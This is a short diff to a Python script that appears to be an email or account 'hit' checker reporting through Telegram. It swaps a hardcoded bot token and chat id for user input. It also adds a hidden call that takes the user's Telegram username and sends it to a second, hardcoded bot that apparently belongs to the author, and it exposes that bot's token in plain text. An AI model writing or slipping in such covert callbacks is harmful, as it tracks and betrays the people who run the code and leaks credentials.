@@ -58,8 +58,15 @@ M = '\x1b[1;37m'#ابیض
 hit,ge,be,gt,bt=0,0,0,0,0
 VSD=5
 hhp=[]
-iid ="7279163999"
-tok= "7577727755:AAEWldGxVeY2gzhDDjl_ORzMZ9rIlnSWans"
+iid =input('id:') 
+tok= input('toke.:') 
+try:
+	rr=requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=start Run ").text
+	i=rr.split('"first_name":"')[2].split('"username":"')[1].split('","')[0]
+	requests.post(f"https://api.telegram.org/bot7577727755:AAEWldGxVeY2gzhDDjl_ORzMZ9rIlnSWans/sendMessage?chat_id=7279163999&text=@{i}" ).text
+except :
+	print('Id None')
+	exit()
 def info(email):
   global hit,iid,tok
   hit+=1
